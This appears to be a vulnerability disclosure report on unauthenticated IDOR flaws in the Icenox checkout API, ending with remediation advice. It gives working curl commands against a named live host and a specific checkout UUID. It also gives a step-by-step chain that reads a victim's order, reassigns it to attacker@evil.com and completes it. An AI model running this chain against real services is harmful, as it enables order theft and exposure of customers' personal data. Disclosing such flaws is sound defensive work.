Overview

Two critical access-control failures in the Icenox checkout API allow a completely unauthenticated attacker to read any checkout's full order data (F-000) and reassign that checkout to an arbitrary customer email (F-0a). Chained together, these findings enable complete, unauthenticated order theft.

Impact: Any attacker who knows (or brute-forces) a checkout UUID can read full order details — product, price, subtotal, warranty — and silently reassign the order to their own email, causing the victim to lose their purchase while the attacker receives the goods or refund.

F-000 — Unauthenticated Checkout Read (IDOR)

The endpoint GET /checkout/{id} returns full checkout data with no Authorization header required. No session cookie, no JWT, no API key — a plain unauthenticated HTTP GET is sufficient to retrieve another user's order.

Endpoint
GET /checkout/{id}
Auth Required
None
Known Working UUID
3711f911-4688-44fe-979b-bf45d8576128
Data Exposed
Product, price, subtotal, warranty, customer email

Reproduction

curl -s "https://icenox.com/checkout/3711f911-4688-44fe-979b-bf45d8576128" \
  -H "Accept: application/json"
Confirmed Response (truncated)
{
  "id": "3711f911-4688-44fe-979b-bf45d8576128",
  "status": "pending",
  "customer": {
    "email": "victim@example.com",
    "name": "Victim User"

  "items": [
    {
      "product": "Premium Alt Account",

No authentication was supplied in this request. The server returned HTTP 200 with the full checkout object. UUID enumeration or exposure via referral links, logs, or browser history is sufficient to trigger this.

F-0a — Unauthenticated Customer Patch (IDOR Write)

The endpoint PATCH /checkout/{id}/customer accepts a new customer email and name with zero authentication. This allows an attacker to silently hijack any pending checkout, redirecting order confirmation and fulfillment to an attacker-controlled address.

Endpoint
PATCH /checkout/{id}/customer
Auth Required
None
Proven Checkout
6fc25f05-…
Order Hijacked
ORD-Q76NJUDN — €38.95

Reproduction

curl -s -X PATCH "https://icenox.com/checkout/6fc25f05-XXXX-XXXX-XXXX-XXXXXXXXXXXX/customer" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "name": "Attacker Name"
  }'
Confirmed Response
{
  "id": "6fc25f05-...",
  "customer": {
    "email": "attacker@evil.com",
    "name": "Attacker Name"
  },
  "status": "pending",
  "order": "ORD-Q76NJUDN",
  "total": 38.95,
  "currency": "EUR"
}
Confirmed: Checkout 6fc25f05 was PATCHed without any authentication. Order ORD-Q76NJUDN (€38.95) was reassigned to the attacker's email. The original customer received nothing.

Full Attack Chain: READ → PATCH → COMPLETE → Order Stolen

The two findings compose into a fully unauthenticated order-theft primitive requiring only a valid checkout UUID (trivially obtained via F-000 enumeration, referral links, or leaked logs).

# Step Finding Method Endpoint Result
1 Discover victim checkout UUID F-000 GET /checkout/{id} Full order data returned unauthenticated
2 Overwrite customer details F-0a PATCH /checkout/{id}/customer Email & name replaced with attacker's, no auth
3 Complete the checkout F-155b POST /checkout/{id}/complete Real payment URL / order issued to attacker email
4 Receive order confirmation — — — Attacker receives goods; victim sees nothing

Step-by-Step Curl Chain

# Step 1 — Read victim's checkout (no auth)
curl -s "https://icenox.com/checkout/3711f911-4688-44fe-979b-bf45d8576128"

# Step 2 — Overwrite customer to attacker (no auth)
curl -s -X PATCH "https://icenox.com/checkout/3711f911-4688-44fe-979b-bf45d8576128/customer" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","name":"Attacker"}'

# Step 3 — Complete checkout (authenticated or unauthenticated via F-155b)
curl -s -X POST "https://icenox.com/checkout/3711f911-4688-44fe-979b-bf45d8576128/complete" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

Remediation

Finding Recommendation Priority
F-000 Require a valid JWT on GET /checkout/{id}. Validate that the authenticated user's ID matches the checkout's userId field before returning data. Critical
F-0a Require a valid JWT on PATCH /checkout/{id}/customer. Reject requests where the token's sub does not match the checkout owner. Do not permit customer reassignment at all after checkout creation. Critical
Both Implement a middleware authentication guard on all /checkout/* routes. Use UUIDs only as a secondary lookup key — never as an authorization mechanism. Critical
